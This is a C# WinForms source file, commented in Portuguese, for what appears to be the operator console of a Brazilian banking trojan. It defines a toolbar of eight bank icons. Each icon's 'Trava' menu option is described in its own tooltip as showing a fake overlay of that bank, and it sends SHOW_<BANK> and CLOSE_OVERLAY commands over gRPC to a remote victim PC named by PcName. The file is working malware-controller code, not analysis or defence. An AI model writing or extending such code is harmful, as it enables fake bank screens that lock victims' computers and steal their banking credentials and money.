#nullable disable
using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using System.Collections.Generic;

namespace ServidorScreenPanel
{
    /// <summary>
    /// Barra de ícones de bancos que aparece ao passar o mouse
    /// Similar ao comportamento de dock auto-hide
    /// </summary>
    public class BankIconBar : Panel
    {
        private readonly ClientSession _session;
        private readonly MainForm _mainForm;
        private System.Windows.Forms.Timer _hideTimer;
        private bool _isVisible = false;
        private const int ICON_SIZE = 40;
        private const int ICON_SPACING = 8;
        private const int BAR_PADDING = 8;

        // Definição dos bancos suportados
        private readonly List<BankInfo> _banks = new List<BankInfo>
        {
            new BankInfo { Code = "BB", Name = "Banco do Brasil", IconFile = "bb.svg", OverlayCommand = "SHOW_BB1" },
            new BankInfo { Code = "CEF", Name = "Caixa Econômica Federal", IconFile = "caixa.svg", OverlayCommand = "SHOW_CEF1" },
            new BankInfo { Code = "ITAU", Name = "Itaú", IconFile = "itau.svg", OverlayCommand = "SHOW_ITAU1" },
            new BankInfo { Code = "BRADESCO", Name = "Bradesco", IconFile = "bradesco.svg", OverlayCommand = "SHOW_BRADESCO1" },
            new BankInfo { Code = "SANTANDER", Name = "Santander", IconFile = "santander.svg", OverlayCommand = "SHOW_SANTANDER1" },
            new BankInfo { Code = "SICREDI", Name = "Sicredi", IconFile = "sicredi.svg", OverlayCommand = "SHOW_SICREDI1" },
            new BankInfo { Code = "SICOOB", Name = "Sicoob", IconFile = "sicoob.svg", OverlayCommand = "SHOW_SICOOB1" },
            new BankInfo { Code = "BNB", Name = "Banco do Nordeste", IconFile = "bnb.svg", OverlayCommand = "SHOW_BNB1" }
        };

        public BankIconBar(ClientSession session, MainForm mainForm)
        {
            _session = session;
            _mainForm = mainForm;

            InitializeComponent();
            LoadBankIcons();
            SetupAutoHide();
        }

        private void InitializeComponent()
        {
            // Configuração do painel
            this.BackColor = Color.FromArgb(240, 45, 45, 48); // Semi-transparente
            this.Height = ICON_SIZE + (BAR_PADDING * 2);
            this.Dock = DockStyle.Top;
            this.Visible = false; // Inicia oculto

            // Permitir que o painel receba eventos de mouse
            this.MouseEnter += BankIconBar_MouseEnter;
            this.MouseLeave += BankIconBar_MouseLeave;
        }

        private void LoadBankIcons()
        {
            int x = BAR_PADDING;
            string iconBasePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "BankIcons");

            foreach (var bank in _banks)
            {
                string iconPath = Path.Combine(iconBasePath, bank.IconFile);

                // Criar PictureBox para o ícone
                var iconBox = new PictureBox
                {
                    Width = ICON_SIZE,
                    Height = ICON_SIZE,
                    Left = x,
                    Top = BAR_PADDING,
                    SizeMode = PictureBoxSizeMode.Zoom,
                    BackColor = Color.Transparent,
                    Cursor = Cursors.Hand,
                    Tag = bank // Armazena info do banco
                };

                // Carregar ícone (SVG será convertido para bitmap se necessário)
                try
                {
                    if (File.Exists(iconPath))
                    {
                        // Para SVG, vamos criar um ícone temporário ou converter
                        // Por enquanto, vamos usar um quadrado colorido como placeholder
                        iconBox.Image = CreateBankPlaceholder(bank.Code);
                    }
                    else
                    {
                        iconBox.Image = CreateBankPlaceholder(bank.Code);
                    }
                }
                catch
                {
                    iconBox.Image = CreateBankPlaceholder(bank.Code);
                }

                // Tooltip
                var tooltip = new ToolTip();
                tooltip.SetToolTip(iconBox, bank.Name);

                // Eventos
                iconBox.Click += BankIcon_Click;
                iconBox.MouseEnter += IconBox_MouseEnter;
                iconBox.MouseLeave += IconBox_MouseLeave;

                this.Controls.Add(iconBox);

                x += ICON_SIZE + ICON_SPACING;
            }
        }

        private Image CreateBankPlaceholder(string bankCode)
        {
            // Criar uma imagem placeholder temporária com a sigla do banco
            var bmp = new Bitmap(ICON_SIZE, ICON_SIZE);
            using (var g = Graphics.FromImage(bmp))
            {
                // Cores por banco
                Color bgColor = bankCode switch
                {
                    "BB" => Color.FromArgb(255, 255, 204, 0),      // Amarelo BB
                    "CEF" => Color.FromArgb(255, 0, 102, 179),     // Azul Caixa
                    "ITAU" => Color.FromArgb(255, 236, 95, 0),     // Laranja Itaú
                    "BRADESCO" => Color.FromArgb(255, 204, 0, 0),  // Vermelho Bradesco
                    "SANTANDER" => Color.FromArgb(255, 236, 0, 0), // Vermelho Santander
                    "SICREDI" => Color.FromArgb(255, 0, 153, 51),  // Verde Sicredi
                    "SICOOB" => Color.FromArgb(255, 0, 102, 51),   // Verde escuro Sicoob
                    "BNB" => Color.FromArgb(255, 0, 102, 204),     // Azul BNB
                    _ => Color.Gray
                };

                g.FillRectangle(new SolidBrush(bgColor), 0, 0, ICON_SIZE, ICON_SIZE);

                // Texto branco com a sigla
                using (var font = new Font("Arial", 9, FontStyle.Bold))
                {
                    var sf = new StringFormat
                    {
                        Alignment = StringAlignment.Center,
                        LineAlignment = StringAlignment.Center
                    };
                    g.DrawString(bankCode, font, Brushes.White,
                        new RectangleF(0, 0, ICON_SIZE, ICON_SIZE), sf);
                }
            }
            return bmp;
        }

        private void BankIcon_Click(object sender, EventArgs e)
        {
            if (sender is not PictureBox iconBox || iconBox.Tag is not BankInfo bank)
                return;

            // Criar menu contextual
            var menu = new ContextMenuStrip
            {
                BackColor = Color.FromArgb(45, 45, 48),
                ForeColor = Color.White
            };

            // Opção: Trava (Mostrar Overlay)
            var menuTrava = new ToolStripMenuItem
            {
                Text = "🔒 Trava",
                ToolTipText = $"Mostrar overlay falso de {bank.Name}"
            };
            menuTrava.Click += (s, ev) => ShowBankOverlay(bank);
            menu.Items.Add(menuTrava);

            // Opção: Remover Overlay
            var menuRemover = new ToolStripMenuItem
            {
                Text = "❌ Remover",
                ToolTipText = "Fechar overlay ativo"
            };
            menuRemover.Click += (s, ev) => CloseOverlay();
            menu.Items.Add(menuRemover);

            menu.Items.Add(new ToolStripSeparator());

            // Opção: Info do Banco
            var menuInfo = new ToolStripMenuItem
            {
                Text = $"ℹ️ {bank.Name}",
                Enabled = false
            };
            menu.Items.Add(menuInfo);

            // Mostrar menu na posição do cursor
            menu.Show(iconBox, new Point(0, iconBox.Height));
        }

        private async void ShowBankOverlay(BankInfo bank)
        {
            if (_session?.SendCommandAsync == null)
                return;

            try
            {
                _mainForm?.AddLog($"[BANK] Mostrando overlay: {bank.Name} ({bank.Code}) - {_session.PcName}");

                var cmd = new ExemploGrpc.ScreenCommand
                {
                    Type = bank.OverlayCommand,
                    Payload = ""
                };

                await _session.SendCommandAsync(cmd);

                _mainForm?.AddLog($"[BANK] Overlay enviado: {bank.Code} -> {_session.PcName}");
            }
            catch (Exception ex)
            {
                _mainForm?.AddLog($"[BANK] Erro ao enviar overlay: {ex.Message}");
            }
        }

        private async void CloseOverlay()
        {
            if (_session?.SendCommandAsync == null)
                return;

            try
            {
                _mainForm?.AddLog($"[BANK] Fechando overlay - {_session.PcName}");

                var cmd = new ExemploGrpc.ScreenCommand
                {
                    Type = "CLOSE_OVERLAY",
                    Payload = ""
                };

                await _session.SendCommandAsync(cmd);

                _mainForm?.AddLog($"[BANK] Overlay fechado - {_session.PcName}");
            }
            catch (Exception ex)
            {
                _mainForm?.AddLog($"[BANK] Erro ao fechar overlay: {ex.Message}");
            }
        }

        // ============ AUTO-HIDE BEHAVIOR ============

        private void SetupAutoHide()
        {
            _hideTimer = new System.Windows.Forms.Timer
            {
                Interval = 2000 // Esconde após 2 segundos sem mouse
            };
            _hideTimer.Tick += HideTimer_Tick;
        }

        public void ShowBar()
        {
            if (!_isVisible)
            {
                _isVisible = true;
                this.Visible = true;
                _hideTimer.Stop();
            }
        }

        public void HideBar()
        {
            if (_isVisible)
            {
                _hideTimer.Start();
            }
        }

        private void BankIconBar_MouseEnter(object sender, EventArgs e)
        {
            _hideTimer.Stop();
            ShowBar();
        }

        private void BankIconBar_MouseLeave(object sender, EventArgs e)
        {
            HideBar();
        }

        private void IconBox_MouseEnter(object sender, EventArgs e)
        {
            _hideTimer.Stop();
            if (sender is PictureBox iconBox)
            {
                // Efeito hover: aumentar levemente
                iconBox.Width = ICON_SIZE + 4;
                iconBox.Height = ICON_SIZE + 4;
                iconBox.Top = BAR_PADDING - 2;
            }
        }

        private void IconBox_MouseLeave(object sender, EventArgs e)
        {
            if (sender is PictureBox iconBox)
            {
                // Voltar ao tamanho normal
                iconBox.Width = ICON_SIZE;
                iconBox.Height = ICON_SIZE;
                iconBox.Top = BAR_PADDING;
            }
        }

        private void HideTimer_Tick(object sender, EventArgs e)
        {
            _hideTimer.Stop();
            _isVisible = false;
            this.Visible = false;
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                _hideTimer?.Dispose();

                // Limpar imagens dos ícones
                foreach (Control ctrl in this.Controls)
                {
                    if (ctrl is PictureBox pb)
                    {
                        pb.Image?.Dispose();
                    }
                }
            }
            base.Dispose(disposing);
        }
    }

    // ============ CLASSES AUXILIARES ============

    public class BankInfo
    {
        public string Code { get; set; }
        public string Name { get; set; }
        public string IconFile { get; set; }
        public string OverlayCommand { get; set; }
    }
}
